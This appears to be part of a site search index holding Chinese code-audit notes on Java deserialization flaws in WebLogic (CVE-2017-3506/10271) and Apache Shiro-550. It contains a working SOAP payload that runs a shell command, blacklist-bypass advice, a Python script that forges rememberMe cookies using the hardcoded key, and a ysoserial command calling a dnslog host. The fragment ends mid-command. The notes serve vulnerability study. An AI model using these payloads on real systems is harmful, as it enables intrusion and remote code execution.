\u6211\u4eecXML\u4e2d\u7b2c\u4e00\u4e2a\u6807\u7b7e\u662fJAVA\uff0c\u4e8e\u662f\u6211\u4eec\u5728JavaElementHandler\u5404\u65b9\u6cd5\u4e0b\u65ad\u70b9\u540e\uff0c\u53ef\u4ee5\u53d1\u73b0next\u65b9\u6cd5\u5185\u90e8\u4f1a\u5148\u5b9e\u4f8b\u5316JavaElementHandler\uff0c\u7136\u540e\u8c03\u7528addAttribute\uff0c\u5c06\u83b7\u53d6\u7684\u7c7b\u5bf9\u8c61(java.beans.XMLDecoder)\u7f6e\u5165this\u3002 \u7136\u540e\u81ea\u7136\u662f\u89e3\u6790object\u6807\u7b7e\uff0c\u7531\u4e8eObjectElementHandler\u672a\u5b9a\u4e49\u5bf9class\u5c5e\u6027\u7684\u89e3\u6790\uff0c\u6240\u4ee5\u4f1a\u8c03\u7528\u7236\u7c7bNewElementHandler\u5bf9\u5176\u8fdb\u884c\u89e3\u6790\uff0c\u5c06\u83b7\u53d6\u7684\u7c7b\u5bf9\u8c61(java.lang.ProcessBuilder)\u7f6e\u5165this \u5c31\u8fd9\u6837 \u5f97\u5230\u6807\u7b7e->\u5b9e\u4f8b\u5316Handler->\u5faa\u73af\u6807\u7b7e\u5c5e\u6027\u8fdb\u884c\u4e8b\u4ef6\u5904\u7406 \uff0c\u76f4\u5230\u89e3\u6790\u5230\u7b2c\u4e00\u4e2a\u672b\u6807\u7b7e(EndElement)\\ ,\u4fbf\u4f1a\u6267\u884cStringElementHandler#getValueObject\uff0c\u8fd4\u56de\u88abValueObjectImpl.create\u5904\u7406\u8fc7\u7684\u6807\u7b7e\u5185\u7684\u503c\u3002 \u7136\u540e\u63a5\u4e0b\u6765\u4f1a\u628a\u8fd9\u4e2aValueObjectImpl\u5bf9\u8c61\u8d4b\u503c\u5230\u7236\u6807\u7b7e\u5bf9\u5e94\u7684handler\u7684\u5c5e\u6027\u91cc \u800c\u89e3\u6790\u5230\\ \\ calc\\ \\ \u7684\\ \u65f6\uff0c\u4f1a\u6839\u636eif\u903b\u8f91\u5224\u65ad\u8fd9\u91ccvoid\u6807\u7b7e\u7684\u4f5c\u7528\uff0c\u8fd9\u91cc\u5224\u65ad\u7684void\u8d77\u5230\u4e00\u4e2a\u6570\u7ec4\u5143\u7d20\u8d4b\u503c\u7684\u4f5c\u7528\uff0c\u4e8e\u662f\u4fbf\u901a\u8fc7set\u65b9\u6cd5\u5f80Array\u8d4b\u503c\u3002 \u5728\u89e3\u6790\u5230\\ \\ \u7684\u672b\u6807\u7b7e\\ \u65f6\uff0c\u5b83\u7684\u903b\u8f91\u662f\u8fd9\u6837\u7684\uff0c\u5148\u83b7\u53d6\u7236handler\u5bf9\u5e94type\u7684\u5b9e\u4f8b\u5316\u5bf9\u8c61\uff0c\u7136\u540e\u518d\u5bf9\u5176\u4f7f\u7528start\u65b9\u6cd5 \u5982\u679c\u6211\u4eec\u8ddf\u8fdb\u8fd9\u4e2agetContextBean\u5c31\u4f1a\u6765\u5230\u8fd9\u91cc\uff0c\u53d1\u73b0\u786e\u5b9e\u662f\u8c03\u7528\u94fe\u7236handler\u5373ObjectElementHandler\u7684getValueObject \u8ddf\u8fdb\u770b\u770b\u7236handler\u7684getValueObject\u903b\u8f91\uff0c\u53d1\u73b0\u786e\u5b9e\u662f\u8fd4\u56de\u4e86\u4e00\u4e2anew ProcessBuilder(\"calc\"). calc\u5b57\u6bb5\u5728var5.argument\u4e2d\uff0c\u622a\u56fe\u4e2d\u6ca1\u6709\u622a\u51fa\u6765\u3002 \u56de\u5230\u672chandler\uff0c\u901a\u8fc7\u62fc\u63a5\uff0c\u6267\u884c\u4e86new ProcessBuilder(\"calc\").start(); \u5f39\u51fa\u8ba1\u7b97\u5668\u3002","title":"ScanDocument"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_5","text":"\u5f53xml\u6570\u636e\u4f20\u5165\u5230XMLDecoder.readObejct\u540e\u7ecf\u8fc7\u4e00\u4e9b\u5904\u7406\u4f1a\u4f20\u5165\u5230scanDocument\u65b9\u6cd5\u91cc\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u5faa\u73af\u89e3\u6790XML\u6807\u7b7e\u5e76\u4ea4\u7531\u76f8\u5e94\u7684Handler\u8fdb\u884c\u5904\u7406\uff0c\u4e14\u5b50\u6807\u7b7e\u7684handler\u5bf9\u7236\u6807\u7b7e\u7684handler\u7531\u94fe\u8868\u7ed3\u6784\u4e32\u8054\u8d77\u6765\uff0c\u6240\u4ee5\u6bcf\u89e3\u6790\u4e00\u4e2a\u6807\u7b7e\u5c31\u4f1a\u5f80\u8fd9\u4e2a\u94fe\u8868\u7ed3\u6784\u589e\u6dfb\u65b0\u5143\u7d20\u5e76\u8fdb\u884c\u4e00\u4e9b\u4e8b\u4ef6\u5904\u7406\u3002 \u4ece\u5b89\u5168\u65b9\u9762\u800c\u8a00\uff0c\u4fbf\u662f\u653b\u51fb\u8005\u901a\u8fc7\u4f20\u5165\u6076\u610fXML\u6570\u636e\u4ea4\u7531XMLDecoder\u8fdb\u884c\u89e3\u6790\uff0cXMLDecoder\u4f1a\u5faa\u73af\u904d\u5386XML\u6570\u636e\u5e76\u8fdb\u884c\u62fc\u63a5\u5904\u7406\uff0c\u76f4\u5230\u6700\u540e\u62fc\u63a5\u51fa\u5b8c\u6574\u7684\u6076\u610f\u8bed\u53e5\u5e76\u6267\u884c\u3002","title":"\u603b\u7ed3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/Weblogic/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90Weblogic%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#cve-2017-3506cve-2017-10271","text":"\u5f71\u54cd\u8303\u56f4 WebLogic 10.3.6.0 WebLogic 12.1.3.0 WebLogic 12.2.1.0 WebLogic 12.2.1.1 WebLogic 12.2.1.2 \u8be5\u6f0f\u6d1e\u5229\u7528weblogic\u7684wls-wsat\u7ec4\u4ef6\u5bf9XML\u7528XMLDecoder\u8fdb\u884c\u89e3\u6790\u7684\u529f\u80fd\uff0c\u4ece\u800c\u5bf9\u5176\u4f20\u5165\u6076\u610fXML\u6570\u636e\u9020\u6210\u53cd\u5e8f\u5217\u5316\u653b\u51fb\u3002 \u590d\u73b0\u5206\u6790\u5982\u4e0b [*] wls-wsat\u7ec4\u4ef6\u8def\u5f84\uff1a /wls-wsat/CoordinatorPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/ParticipantPortType /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationPortTypeRPC /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/RegistrationRequesterPortType /wls-wsat/RegistrationRequesterPortType1 \u5bf9weblogic\u8def\u7531 http://xxx:7001/wls-wsat/CoordinatorPortType \u53d1\u9001\u5982\u4e0b\u6570\u636e\u5305 <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> <soapenv:Header> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <java version=\"1.8.0_131\" class=\"java.beans.XMLDecoder\"> <void class=\"java.lang.ProcessBuilder\"> <array class=\"java.lang.String\" length=\"3\"> <void index=\"0\"> <string>/bin/bash</string> </void> <void index=\"1\"> <string>-c</string> </void> <void index=\"2\"> <string>touch /tmp/1234</string> </void> </array> <void method=\"start\"/></void> </java> </work:WorkContext> </soapenv:Header> <soapenv:Body/> </soapenv:Envelope> \u5e76\u4fee\u6539content-type \u6211\u8fd9\u91cc\u76f4\u63a5\u5728javaElementHandler#addAttribute \u4e0b\u65ad\u70b9\u7136\u540e\u89c2\u5bdf\u5806\u6808\u4fe1\u606f \u53ef\u4ee5\u53d1\u73b0\u662fWorkContextXmlInputAdapter#readUTF \u5904\u8c03\u7528\u4e86xmlDecoder\u7684readObject\u65b9\u6cd5\u3002\u6211\u4eec\u7684XML\u5c31\u8fd9\u6837\u4f20\u8fdb\u53bb\u7545\u901a\u65e0\u963b\u7684\u8fdb\u5165\u4e86XMLDecoder\u7684\u89e3\u6790\u3002 \u653b\u51fb\u7ed3\u679c CVE-2017-3506 \u4fee\u8865\u65b9\u6848\u4e3a\u91c7\u7528\u9ed1\u540d\u5355\u673a\u5236\u7981\u7528\u4e86object\u6807\u7b7e\uff0c\u8fd9\u7b80\u76f4\u4e0d\u8981\u592a\u597d\u7ed5\uff0c\u6240\u4ee5CVE-2017-10271\u6765\u4e86\u3002 \u8fd9\u662f\u9ed1\u540d\u5355\u6821\u9a8c\u7684\u76f8\u5173\u4ee3\u7801\u3002 private void validate(InputStream is) { WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try { SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() { public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException { if(qName.equalsIgnoreCase(\"object\")) { throw new IllegalStateException(\"Invalid context type: object\"); } } }); } catch (ParserConfigurationException var5) { throw new IllegalStateException(\"Parser Exception\", var5); } catch (SAXException var6) { throw new IllegalStateException(\"Parser Exception\", var6); } catch (IOException var7) { throw new IllegalStateException(\"Parser Exception\", var7); } } \u7ed5\u8fc7\u5c31\u662f\u628aobject\u6807\u7b7e\u6539\u4e3avoid\u6807\u7b7e\u5c31\u884c\u4e86\uff0c\u56e0\u4e3a\u4ece\u4ee3\u7801\u5c42\u9762\u6765\u770b\uff0cvoid\u548cobject\u7684handler\u56e0\u4e3a\u662f\u7236\u5b50\u7c7b\u5173\u7cfb\uff0c\u6240\u4ee5\u903b\u8f91\u662f\u9ad8\u5ea6\u76f8\u540c\u7684\u3002 CVE-2017-10271\u7684\u8865\u4e01\u5219\u662f\u7ee7\u7eed\u628a\u9ed1\u540d\u5355\u8865\u5168\uff0c\u53ef\u89c1\u9664\u4e86object\uff0c\u8fd8\u6709method\uff0cnew\uff0carray\u7b49\u6807\u7b7e\u90fd\u88ab\u505a\u4e86\u5904\u7406\u3002 object\uff0cnew\uff0cmethod\u6807\u7b7e\u76f4\u63a5\u88abban\uff0cvoid\u5c5e\u6027\u53ea\u80fd\u8bbe\u7f6eindex\uff0carray\u7684class\u53ea\u80fd\u8bbe\u7f6e\u4e3abyte\u7c7b\u578b\u3002 private void validate(InputStream is) { WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try { SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() { private int overallarraylength = 0; public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException { if(qName.equalsIgnoreCase(\"object\")) { throw new IllegalStateException(\"Invalid element qName:object\"); } else if(qName.equalsIgnoreCase(\"new\")) { throw new IllegalStateException(\"Invalid element qName:new\"); } else if(qName.equalsIgnoreCase(\"method\")) { throw new IllegalStateException(\"Invalid element qName:method\"); } else { if(qName.equalsIgnoreCase(\"void\")) { for(int attClass = 0; attClass < attributes.getLength(); ++attClass) { if(!\"index\".equalsIgnoreCase(attributes.getQName(attClass))) { throw new IllegalStateException(\"Invalid attribute for element void:\" + attributes.getQName(attClass)); } } } if(qName.equalsIgnoreCase(\"array\")) { String var9 = attributes.getValue(\"class\"); if(var9 != null && !var9.equalsIgnoreCase(\"byte\")) { throw new IllegalStateException(\"The value of class attribute is not valid for array element.\"); } \u76f4\u63a5\u7ed5\u5b83\u7684\u9ed1\u540d\u5355\u7684\u8bdd\uff0c\u6709\u5982\u4e0b\u601d\u8def \" \u4f7f\u7528class\u6807\u7b7e\u6784\u9020\u7c7b\uff0c\u4f46\u662f\u7531\u4e8e\u9650\u5236\u4e86method\u51fd\u6570\uff0c\u65e0\u6cd5\u8fdb\u884c\u51fd\u6570\u8c03\u7528\uff0c\u53ea\u80fd\u4ece\u6784\u9020\u65b9\u6cd5\u4e0b\u624b\uff0c\u4e14\u53c2\u6570\u4e3a\u57fa\u672c\u7c7b\u578b\uff1a \u6784\u9020\u51fd\u6570\u6709\u5199\u6587\u4ef6\u64cd\u4f5c\uff0c\u6587\u4ef6\u540d\u548c\u5185\u5bb9\u53ef\u63a7\uff0c\u53ef\u4ee5\u8fdb\u884cgetshell\u3002 \u6784\u9020\u51fd\u6570\u6709\u5176\u4ed6\u7684\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u884c\u4e8c\u6b21\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\u3002 \u6784\u9020\u51fd\u6570\u76f4\u63a5\u6709\u6267\u884c\u547d\u4ee4\u7684\u64cd\u4f5c\uff0c\u6267\u884c\u547d\u4ee4\u53ef\u63a7\u3002 \u6709\u5176\u5b83\u7684\u53ef\u80fd\u5bfc\u81f4rce\u7684\u64cd\u4f5c\uff0c\u6bd4\u5982\u8868\u8fbe\u5f0f\u6ce8\u5165\u4e4b\u7c7b\u7684\u3002 \u76ee\u524d\u5b58\u5728\u7684\u5229\u7528\u94fe\u6709\uff1a FileSystemXmlApplicationContext-RCE UnitOfWorkChangeSet-RCE ysoserial-jdk7u21-RCE JtaTransactionManager-JNDI\u6ce8\u5165","title":"CVE-2017-3506\\&amp;CVE-2017-10271"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro/","text":"shiro shiro\u53cd\u5e8f\u5217\u5316(shiro-550\u4e0eshiro-721) shiro\u7684tricks","title":"shiro"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro/#shiro","text":"shiro\u53cd\u5e8f\u5217\u5316(shiro-550\u4e0eshiro-721) shiro\u7684tricks","title":"shiro"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/","text":"shiro\u53cd\u5e8f\u5217\u5316(shiro-550\u4e0eshiro-721) \u76ee\u5f55 shiro \u600e\u4e48\u5224\u65ad\u662f\u5426\u662fshiro\u7f51\u7ad9 shiro-550 \u7b80\u4ecb \u524d\u671f\u51c6\u5907 \u5f00\u59cb\u52a8\u8c03 \u5e8f\u5217\u5316\uff0c\u52a0\u5bc6 \u53cd\u5e8f\u5217\u5316\uff0c\u89e3\u5bc6 \u89e3\u5bc6\uff0c\u91cd\u5199cookie\uff0c\u4ee5\u5199\u5165payload \u5bc6\u94a5\u83b7\u53d6 \u5229\u7528 URLDNS cc\u94fe2 JRMP \u5c0f\u603b\u7ed3 \u5ba1\u8ba1\u5173\u952e\u5b57 shiro-721 \u7b80\u4ecb \u73af\u5883\u642d\u5efa \u5229\u7528 shiro Apache shiro \u662fjava\u7684\u4e00\u4e2a\u5b89\u5168\u6846\u67b6\uff0c\u53ef\u4ee5\u5e2e\u52a9\u5b8c\u6210\u8ba4\u8bc1\uff0c\u6388\u6743\uff0c\u52a0\u5bc6\uff0c\u4f1a\u8bdd\u7ba1\u7406\u7b49\u529f\u80fd\u3002\u5b83\u4e0d\u8ddf\u4efb\u4f55\u6846\u67b6\u6216\u5bb9\u5668\u7ed1\u5b9a\uff0c\u53ef\u4ee5\u72ec\u7acb\u8fd0\u884c\u3002 \u600e\u4e48\u5224\u65ad\u662f\u5426\u662fshiro\u7f51\u7ad9 \u53d1\u9001cookie\u5e26\u6709rememberMe=0\u7684\u5305\uff0c\u82e5\u8fd4\u56de\u5305\u7684\u5934\u90e8\u6709rememberMe\uff0c\u5219\u4e3ashiro\u7ad9\u70b9 shiro-550 \u7b80\u4ecb \u5f53shiro\u7248\u672c\u5c0f\u4e8e1.2.5\u65f6\uff0c\u4e3b\u8981\u662f\u7531shiro\u7684rememberMe\u5185\u5bb9\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4\u7684\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u9020\u6210\u7684\u539f\u56e0\u662fAES\u5bc6\u94a5\u88ab\u786c\u7f16\u7801\u5728shiro\u6e90\u7801\u4e2d\uff0c\u8fd9\u5c31\u5bfc\u81f4\u4e86\u53ef\u4ee5\u901a\u8fc7\u5728cookie\u7684rememberMe\u5b57\u6bb5\u63d2\u5165payload\u5b9e\u73b0\u4efb\u610f\u4ee3\u7801\u6267\u884c \u524d\u671f\u51c6\u5907 git clone https://github.com/apache/shiro.git \u4e0b\u8f7dshiro \u7136\u540e git checkout shiro-root-1.2.4,\u5207\u6362\u52301.2.4\u7248\u672c\u8fdb\u884c\u5bf9\u5e94\u7248\u672c\u7684\u6f0f\u6d1e\u8c03\u8bd5 \u7f16\u8f91shiro/samples/web/pom.xml\u6587\u4ef6\uff0c\u5728\u6b64\u5904\u52a0\u5165 1.2 \u7136\u540eidea\u6253\u5f00shiro/samples/web \u4e0b\u7684pom.xml,\u7136\u540eRun -> Edit Configurations \u6dfb\u52a0TomcatServer \u5f85idea\u52a0\u8f7d\u5b8cmaven\u540e\uff0c\u5411tomcat\u90e8\u7f72\u5de5\u4ef6 \u7136\u540e\u542f\u52a8\u5373\u53ef \u5f00\u59cb\u52a8\u8c03 \u5e8f\u5217\u5316\uff0c\u52a0\u5bc6 \u5728org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin \u5904\u4e0b\u65ad\u70b9 \u7136\u540e\u8fdb\u5165shiro\u767b\u9646\u9875\u9762\uff0c\u52fe\u9009 rememberme \uff0c\u8fdb\u884c\u767b\u5f55\uff0c\u65ad\u70b9\u547d\u4e2d \u7136\u540e\u4f1a\u6821\u9a8ctoken\u91cc\u9762\u7684rememberme\u662f\u5426\u4e3atrue\uff0c\u82e5\u4e3atrue\u5219\u6267\u884crememberIdentity\u51fd\u6570 \u6211\u4eec\u8ddf\u8fdbrememberIdentity\u51fd\u6570 \u53d1\u73b0principals\u53d8\u91cf\u83b7\u53d6\u4e86\u9700\u8981remember\u7684\u7528\u6237\u540d\uff08\u6b64\u5904\u4e3aroot\uff09\uff0c\u7136\u540e\u518d\u8c03\u7528\u91cd\u8f7d\u51fd\u6570rememberIdentity\u3002 \u8fd9\u4e2a\u51fd\u6570\u8c03\u7528\u4e86convertPrincipalsToBytes,\u6211\u4eec\u8ddf\u8fdb\u770b\u770b\u8fd9\u4e2a\u51fd\u6570 \u53ef\u4ee5\u53d1\u73b0\u5bf9\u4f20\u5165\u7684principals\u8c03\u7528\u4e86serialize\u65b9\u6cd5\uff0c\u7ee7\u7eed\u8ddf\u8fdbserialize\u65b9\u6cd5 \u7ee7\u7eed\u8ddf\u8fdbserialize\u4f1a\u6765\u5230\u8fd9\u4e2a\u5730\u65b9 \u53d1\u73b0\u5c31\u662f\u5bf9\u5176\u8c03\u7528\u4e86writeObject()\u8fd9\u4e2a\u539f\u751f\u53cd\u5e8f\u5217\u65b9\u6cd5\u800c\u5df2\uff0c\u6ca1\u4ec0\u4e48\u597d\u5eb7\u7684\uff0c\u8f6c\u56de\u5934\u53bb\u770b\u770bconvertPrincipalsToBytes\u90a3\u4e2a\u52a0\u5bc6\u51fd\u6570encrypt \u53d1\u73b0\u901a\u8fc7getCipherService\u65b9\u6cd5\u8fd4\u56de\u4e86\u4e00\u4e2a\u4e1c\u897f\uff0c\u53d1\u73b0\u662f\u52a0\u5bc6\u65b9\u5f0f\u7b49\u4e1c\u897f \u5728\u6b64\u5904156\u884c\u4f1a\u8c03\u7528\u53e6\u4e00\u4e2aencrypt\u65b9\u6cd5\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5e8f\u5217\u5316\u540e\u7684\u7528\u6237\u540d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5219\u662f\u5bc6\u94a5\uff08\u8fd9\u4e2a\u5bc6\u94a5\u662f\u786c\u7f16\u7801\u5199\u5165\u6587\u4ef6\u7684\uff0c\u6240\u4ee5\u9020\u6210\u4e86\u5b89\u5168\u95ee\u9898\uff09\u6211\u4eec\u8ddf\u8fdb \u8fd9\u91cc\u7684ivBytes\u662f\u4e00\u4e2a\u968f\u673a\u751f\u6210\u7684iv\uff08\u6211\u6ca1\u8ddf\u8fdb\u7ec6\u770b),\u7136\u540e\u5728\u8fd9\u4e2a\u65b9\u6cd5\u6700\u540e\u5b83\u8c03\u7528\u4e86encrypt\u7684\u91cd\u8f7d\u51fd\u6570\uff0c\u5e76\u4f20\u5165\u4e86\u5e8f\u5217\u5316\u540e\u7684\u7528\u6237\u540d\uff0ckey\uff0civ\uff0c\u4ee5\u53ca\u4e00\u4e2atrue\u3002\u6211\u4eec\u7ee7\u7eed\u8ddf\u8fdb \u53ef\u4ee5\u53d1\u73b0\u901a\u8fc7arraycopy\uff0c\u628aiv\u548c\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\u6570\u636e\uff08aes\uff09\u653e\u5165\u4e86output,\u6700\u540e\u8fd4\u56de\u4e86output. \u7136\u540e\u8fd9\u4e2areturn\u4f1a\u4e00\u76f4\u8fd4\u56de\u5230\u6b64\u5904 output\u7684\u5185\u5bb9\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u4e86rememberSerializedIdentity\uff0c\u8ddf\u8fdb\u8be5\u51fd\u6570 56\u884c\uff0c\u628abase64\u52a0\u5bc6\u540e\u7684output\u4f5c\u4e3a\u503c\u5199\u5165\u5230cookie\u4e2d\u7684remembername\u952e 57\u884c\u5c06\u5176\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef burp\u6293\u5305\u53d1\u73b0\u4e8b\u5b9e\u786e\u5b9e\u5982\u6b64 \u53e6\u5916\u8bf4\u4e00\u4e0b\u90a3\u4e2a\u786c\u7f16\u7801key\uff0c\u90a3\u4e2a\u786c\u7f16\u7801\u7684key\u5728AbstractRememberMeManager.class DEFAULT_CIPHER_KEY_BYTES\u91cc \u53ef\u4ee5\u53d1\u73b0\u901a\u8fc7getEncryptionCipherKey\u83b7\u5f97\u7684key\u786e\u5b9e\u662fDEFAULT_CIPHER_KEY_BYTES \u6211\u4eec\u7b80\u8981\u7684\u68b3\u7406\u4e00\u4e0b\u8fd9\u4e2a\u6d41\u7a0b\uff0c \u5f53\u6211\u4eec\u52fe\u9009rememberme\u540e\uff0c\u7528\u6237\u540d\u4f1a\u88ab\u5e8f\u5217\u5316\u5904\u7406\uff0c\u7136\u540e\u4e0e\u786c\u7f16\u7801\u7684key\uff0c\u968f\u673a\u751f\u6210\u7684iv\u4e00\u8d77\u8fdb\u884c\u52a0\u5bc6\uff0c\u7136\u540e\u4ee5 iv+\u5bc6\u6587 \u7684base64\u7f16\u7801\u8fd4\u56de\u7ed9\u7528\u6237\u7684\u952e\u4e3arememberme\u7684cookie\u91cc\u3002 \u53cd\u5e8f\u5217\u5316\uff0c\u89e3\u5bc6 \u5728\u6211\u4eec\u52fe\u9009rememberme\u767b\u9646\u540e\uff0c\u5237\u65b0\uff0c\u6293\u5305\uff0c\u5c06\u5176JSESSIONID\u5220\u9664\uff0c\u4f7fshiro\u9a8c\u8bc1cookie\u4e2drememberme\u7684\u503c\u662f\u5426\u6b63\u786e\uff08\u5982\u679c\u4e0d\u5220\u9664JSESSIONID\uff0cshiro\u5219\u76f4\u63a5\u4ee5JSESSIONID\u4e3a\u767b\u9646\u51ed\u8bc1\u4e86\uff0c\u5c31\u4e0d\u4f1a\u9a8c\u8bc1rememberme\u4e2d\u7684\u503c\u4e86\uff09 \u5728org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity \u6253\u4e0b\u65ad\u70b9\uff0c\u653e\u5305\uff0c\u65ad\u70b9\u547d\u4e2d\u3002 \u8ddf\u8fdbgetRememberedPrincipals\u65b9\u6cd5 \u968f\u540e\u518d\u8ddf\u8fdbgetRememberedSerializedIdentity \u5173\u6ce8\u8fd9\u91cc\u768486\u884c\uff0c\u6b64\u5904\u7684\u610f\u601d\u662f\u4ececookie\u4e2d\u83b7\u5f97base64\u7f16\u7801\u540e\u7684cookie\u503c\uff0c\u968f\u540e\u572890\u884c\u5bf9\u5176\u8fdb\u884c\u586b\u5145\uff08CBC\u52a0\u5bc6\u4e2d\u7684\u4e00\u4e2a\u6d41\u7a0b\uff09\uff0c95\u884c\u8fdb\u884cbase64\u89e3\u7801\uff0c\u5e76\u5c06\u5176\u8fd4\u56de \u968f\u540e\u6211\u4eec\u56de\u5230getRememberedPrincipals\u65b9\u6cd5\uff0c\u8ddf\u8fdb\u5176convertBytesToPrincipals\u65b9\u6cd5 \u53d1\u73b0\u5176\u4e2d\u6709\u4e2adecrypt\u65b9\u6cd5\uff0c\u8fd9\u91cc\u7684decrypt\u65b9\u6cd5\u5c31\u662f\u5bf9\u5176\u884caes\u89e3\u5bc6\uff0c\u53d6\u524d\u5341\u516d\u4f4d\u4e3aIV\u3002 \u4e0b\u9762140\u884c\u5219\u662f\u5bf9\u5176\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\u4e86\u3002\u6211\u4eec\u8ddf\u8fdb\u4e00\u4e0b \u518d\u6b21\u8ddf\u8fdbdeserialize\u65b9\u6cd5 \u770b\u5230readObject,\u5c31\u610f\u5473\u7740\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b\u7ed3\u675f\u4e86\u3002 \u68b3\u7406\u4e00\u4e0b\uff0ccookie\u4e2dremenber\u503c\u4f20\u5165\u540e\u5148base64\u89e3\u7801\uff0c\u7136\u540eaes\u89e3\u5bc6\uff0c\u7136\u540e\u53cd\u5e8f\u5217\u5316\u3002 \u89e3\u5bc6\uff0c\u91cd\u5199cookie\uff0c\u4ee5\u5199\u5165payload \u65e2\u7136key\u662f\u56fa\u5b9a\u7684\uff0c\u6211\u4eec\u77e5\u9053\u4e86key\u662f\u4ec0\u4e48\uff0c\u540c\u65f6\u5728CBC\u89e3\u5bc6\u7684\u65f6\u5019\uff0cIV\u7684\u4f5c\u7528\u53ea\u662f\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u533a\u5757\u53bb\u89e3\u5bc6\u7b2c\u4e8c\u4e2a\u533a\u5757\uff08\u751f\u6210\u7684\u7ed3\u679c\u53bb\u89e3\u5bc6\u7b2c\u4e09\u4e2a\u533a\u5757\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff09\uff0c\u6240\u4ee5IV\u53ef\u4ee5\u4e3a\u968f\u673a\u503c\u6ca1\u4ec0\u4e48\u7279\u522b\u8981\u6c42\uff08\u53ea\u8981\u80fd\u89e3\u5bc6\u5c31\u884c\u4e86\uff09\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u81ea\u5df1\u4f2a\u9020\u4e00\u4e2acookie\u3002 python\u811a\u672c\u5982\u4e0b(\u5ad6\u7684\u7b11\u5e08\u5085\u7684)\uff0c\u5e8f\u5217\u5316payload\u7528base64\u683c\u5f0f\u4f20\u5165 ##pip install pycrypto import sys import base64 import uuid from random import Random import subprocess from Crypto.Cipher import AES key = \"kPH+bIxk5D2deZiIxcaaaA==\" mode = AES.MODE_CBC IV = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, IV) payload=base64.b64decode(sys.argv[1]) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() payload=pad(payload) print(base64.b64encode(IV + encryptor.encrypt(payload))) \u7136\u540e\u6211\u4eec\u53ea\u9700\u8981\u4f20\u5165base64\u7f16\u7801\u7684\uff0c\u53bb\u9664\u6362\u884c\u7b26\u7684payload\u5373\u53ef\u3002 \u50cf\u8fd9\u6837 java -jar ./ysoserial-master-SNAPSHOT.jar URLDNS \"http://cao.7squwf.dnslog.cn\" |base64|sed ':label;N;s/\\n//;b label' \u5bc6\u94a5\u83b7\u53d6 \u6709\u4e9b\u65f6\u5019key\u5e76\u4e0d\u662f\u4e00\u6210\u4e0d\u53d8\u7684kPH+bIxk5D2deZiIxcaaaA==\uff0c\u800c\u6709\u53ef\u80fd\u662f\u5176\u4ed6\u503c\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u5de5\u5177 https://github.com/insightglacier/Shiro_exploit \u6765\u7206\u7834\u51fa\u5bc6\u94a5 python .\\shiro_exploit.py -u http://127.0.0.1:8080 \u5373\u53ef\u5f00\u59cb\u7206\u7834\uff0c\u5f53\u7136\u8fd9\u4e2a\u5de5\u5177\u7684\u4f5c\u7528\u4e0d\u4ec5\u4ec5\u5982\u6b64 \u5229\u7528 URLDNS \u8fd9\u4e2a\u94fe\u5176\u5b9e\u6839\u672c\u6ca1\u5565\u5371\u5bb3..\u53ea\u662f\u62ff\u6765\u6d4b\u8bd5\u4e00\u4e0b\u6709\u6ca1\u6709\u6d1e java -jar 